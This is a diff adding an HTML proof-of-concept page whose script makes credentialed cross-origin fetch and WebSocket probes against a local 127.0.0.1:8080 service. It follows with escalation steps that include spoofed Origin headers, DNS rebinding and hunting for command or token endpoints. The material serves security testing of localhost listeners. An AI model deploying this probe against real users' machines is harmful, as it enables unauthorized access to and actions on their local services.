@@ -1,0 +1,51 @@
+<!doctype html>
+<!-- Localhost-listener PoC — port 8080
+     A 127.0.0.1 service is reachable from ANY web page the user visits unless it checks
+     Origin AND authenticates. Host this on a real origin (not file://) so the browser
+     applies normal CORS rules; that is the realistic attacker position. -->
+<meta charset="utf-8"><title>localhost:8080 reachability</title>
+<style>body{font:14px system-ui;margin:2rem;max-width:56rem} pre{background:#111;color:#0f0;padding:1rem;overflow:auto}</style>
+<h1>Reaching 127.0.0.1:8080 from a web origin</h1>
+<pre id="out">running…</pre>
+<script>
+const out = document.getElementById('out');
+const log = (...a) => out.textContent += '\n' + a.join(' ');
+out.textContent = 'origin: ' + location.origin;
+
+const paths = ['/', '/status', '/version', '/api', '/api/v1', '/health', '/rpc', '/json',
+               '/config', '/debug', '/metrics'];
+
+(async () => {
+  for (const p of paths) {
+    // no-cors still PROVES the request was delivered (check the server log); cors proves READ access
+    try {
+      const r = await fetch('http://127.0.0.1:8080' + p, {mode:'cors', credentials:'include'});
+      log('[CORS-READABLE]', p, r.status, (await r.text()).slice(0,180));
+    } catch (e) {
+      try {
+        await fetch('http://127.0.0.1:8080' + p, {mode:'no-cors', credentials:'include'});
+        log('[DELIVERED, not readable]', p, '(no CORS header — still a CSRF-style write surface)');
+      } catch (e2) { log('[blocked]', p, e2.message); }
+    }
+  }
+  // WebSocket ignores same-origin policy entirely: no CORS, only an Origin header the
+  // server has to check itself.
+  try {
+    const ws = new WebSocket('ws://127.0.0.1:8080/');
+    ws.onopen  = () => log('[WS OPEN] the server accepted a cross-origin WebSocket — '
+                         + 'if it does not validate the Origin header, any site owns this API');
+    ws.onmessage = e => log('[WS MSG]', String(e.data).slice(0,200));
+    ws.onerror = () => log('[WS] refused');
+  } catch (e) { log('[WS] ' + e.message); }
+})();
+</script>
+<h2>If this reads data or triggers an action</h2>
+<ol>
+<li>Record the exact request/response pair.</li>
+<li>Check whether the server validates <code>Origin</code> — retry with a spoofed-origin curl
+    (a non-browser client) to see if the browser was the only thing stopping you.</li>
+<li>If it only binds loopback and checks nothing, add the <strong>DNS rebinding</strong> case:
+    a hostname that first resolves to your IP and then to 127.0.0.1 defeats an
+    <code>Origin</code>-less <code>Host: localhost</code> check.</li>
+<li>Escalate: does any endpoint take a path, a command, an update URL, or a token?</li>
+</ol>
